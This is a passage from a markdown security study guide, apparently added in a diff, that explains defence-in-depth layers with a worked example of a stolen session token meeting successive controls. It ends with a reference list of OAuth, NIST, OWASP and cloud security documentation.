+| **Identity** | OAuth/OIDC, MFA, IAM roles per workload, mTLS, least privilege, JIT access | A stolen network position with no valid identity |
+| **Application** | AuthN/AuthZ per request, object-level checks, input validation, output encoding, parameterised queries, CSRF tokens, CSP | An authenticated attacker attempting something they may not do |
+| **Data** | Encryption at rest (KMS CMKs), tokenisation, field-level encryption, key policies, row-level security | A compromised host or a leaked backup |
+| **Supply chain** | Signed images, SBOM, CVE scanning, dependency pinning, admission enforcement | A malicious or vulnerable dependency |
+| **Detection** | CloudTrail, GuardDuty, Security Hub, flow logs, audit logs, anomaly alerting | Everything the preventive layers missed |
+| **Response** | Runbooks, automated isolation, forensic snapshots, tested IR plan | Limits the damage once something is confirmed |
+
+**Worked example — the same attack meeting successive layers:**
+
+```
+An attacker obtains a valid user's session token via a phishing page.
+
+  Edge         → WAF rate-limits the unusual request volume            (slowed)
+  Identity     → the token is sender-constrained to a client cert
+                 the attacker does not have                             (BLOCKED)
+  …had that failed:
+  Application  → object-level authorization: the token's tenant claim
+                 does not match the requested merchant's payments      (BLOCKED)
+  …had that failed:
+  Data         → the export is encrypted with a KMS key whose policy
+                 restricts decrypt to a specific role                   (BLOCKED)
+  …had that failed:
+  Detection    → GuardDuty flags anomalous API volume; CloudTrail shows
+                 the principal; the session is revoked                  (CONTAINED)
+```
+Any one layer alone would eventually be bypassed. Together, the attacker must defeat all of them.
+
+**The principles that make it real rather than a diagram:**
+1. **Assume every layer fails.** Design each control as if it is the last one standing.
+2. **Prefer prevention over detection, but implement both.** An SCP that denies the action beats an alert that tells you it happened.
+3. **Fail closed.** A default-deny NetworkPolicy, an authorization `FallbackPolicy`, a rate limiter that rejects when its state store is unavailable on a login endpoint.
+4. **Make controls independent.** Two controls that share a root cause (both reading the same misconfigured claim) are one control wearing two hats.
+5. **Minimise what needs protecting.** Tokenise the PAN, reduce PCI scope, delete data you do not need, and eliminate secrets entirely with workload identity. **The cheapest control is not having the asset.**
+6. **Test the layers.** Penetration testing, red-team exercises, chaos and game days that deliberately disable a control to confirm the next one holds. An untested layer is an assumption.
+
+---
+
+## References — official documentation and standards
+
+| Topic | Source |
+|---|---|
+| RFC 6749 — The OAuth 2.0 Authorization Framework | https://www.rfc-editor.org/rfc/rfc6749 |
+| RFC 6750 — OAuth 2.0 Bearer Token Usage | https://www.rfc-editor.org/rfc/rfc6750 |
+| RFC 7519 — JSON Web Token (JWT) | https://www.rfc-editor.org/rfc/rfc7519 |
+| RFC 7515 / 7516 — JSON Web Signature / Encryption | https://www.rfc-editor.org/rfc/rfc7515 |
+| RFC 7636 — Proof Key for Code Exchange (PKCE) | https://www.rfc-editor.org/rfc/rfc7636 |
+| RFC 7662 — OAuth 2.0 Token Introspection | https://www.rfc-editor.org/rfc/rfc7662 |
+| RFC 8693 — OAuth 2.0 Token Exchange | https://www.rfc-editor.org/rfc/rfc8693 |
+| RFC 8705 — OAuth 2.0 Mutual-TLS and certificate-bound tokens | https://www.rfc-editor.org/rfc/rfc8705 |
+| **RFC 9700 — OAuth 2.0 Security Best Current Practice** | https://www.rfc-editor.org/rfc/rfc9700 |
+| RFC 9449 — OAuth 2.0 Demonstrating Proof of Possession (DPoP) | https://www.rfc-editor.org/rfc/rfc9449 |
+| RFC 9110 — HTTP Semantics (401/403, idempotent methods) | https://www.rfc-editor.org/rfc/rfc9110 |
+| OAuth 2.1 (draft) | https://datatracker.ietf.org/doc/draft-ietf-oauth-v2-1/ |
+| OpenID Connect Core 1.0 | https://openid.net/specs/openid-connect-core-1_0.html |
+| OpenID Connect Discovery 1.0 | https://openid.net/specs/openid-connect-discovery-1_0.html |
+| FAPI 2.0 Security Profile (financial-grade API) | https://openid.net/specs/fapi-2_0-security-profile.html |
+| NIST SP 800-207 — Zero Trust Architecture | https://csrc.nist.gov/publications/detail/sp/800-207/final |
+| NIST SP 800-63B — Digital Identity Guidelines (authentication) | https://pages.nist.gov/800-63-3/sp800-63b.html |
+| Microsoft Learn — ASP.NET Core authentication overview | https://learn.microsoft.com/en-us/aspnet/core/security/authentication/ |
+| Microsoft Learn — JWT bearer authentication | https://learn.microsoft.com/en-us/aspnet/core/security/authentication/configure-jwt-bearer-authentication |
+| Microsoft Learn — policy-based authorization | https://learn.microsoft.com/en-us/aspnet/core/security/authorization/policies |
+| Microsoft Learn — resource-based authorization | https://learn.microsoft.com/en-us/aspnet/core/security/authorization/resourcebased |
+| Microsoft Learn — CORS in ASP.NET Core | https://learn.microsoft.com/en-us/aspnet/core/security/cors |
+| Microsoft Learn — prevent CSRF (antiforgery) | https://learn.microsoft.com/en-us/aspnet/core/security/anti-request-forgery |
+| Microsoft Learn — prevent XSS | https://learn.microsoft.com/en-us/aspnet/core/security/cross-site-scripting |
+| Microsoft Learn — rate limiting middleware | https://learn.microsoft.com/en-us/aspnet/core/performance/rate-limit |
+| Microsoft Learn — Data Protection API | https://learn.microsoft.com/en-us/aspnet/core/security/data-protection/introduction |
+| Microsoft Learn — Microsoft identity platform (OBO flow) | https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-on-behalf-of-flow |
+| OWASP Top 10 | https://owasp.org/www-project-top-ten/ |
+| OWASP Cheat Sheet Series (XSS, CSRF, SQLi, SSRF, Auth) | https://cheatsheetseries.owasp.org/ |
+| OWASP — SQL Injection Prevention Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html |
+| OWASP — SSRF Prevention Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html |
+| AWS Well-Architected — Security pillar | https://docs.aws.amazon.com/wellarchitected/latest/security-pillar/welcome.html |
+| AWS — IMDSv2 and protecting instance metadata | https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html |
+| AWS — Secrets Manager rotation | https://docs.aws.amazon.com/secretsmanager/latest/userguide/rotating-secrets.html |
+| AWS — KMS key policies | https://docs.aws.amazon.com/kms/latest/developerguide/key-policies.html |
+| PCI Security Standards Council — PCI DSS | https://www.pcisecuritystandards.org/document_library/ |
+| Azure Architecture Center — Rate Limiting / Throttling patterns | https://learn.microsoft.com/en-us/azure/architecture/patterns/rate-limiting-pattern |
+
+---
+
+**Previous:** [14 — CQRS, Saga, Outbox & Idempotency](./14-CQRS-Saga-Outbox-Idempotency.md) | **Next:** [16 — API Security / OWASP](./16-API-Security-OWASP.md)
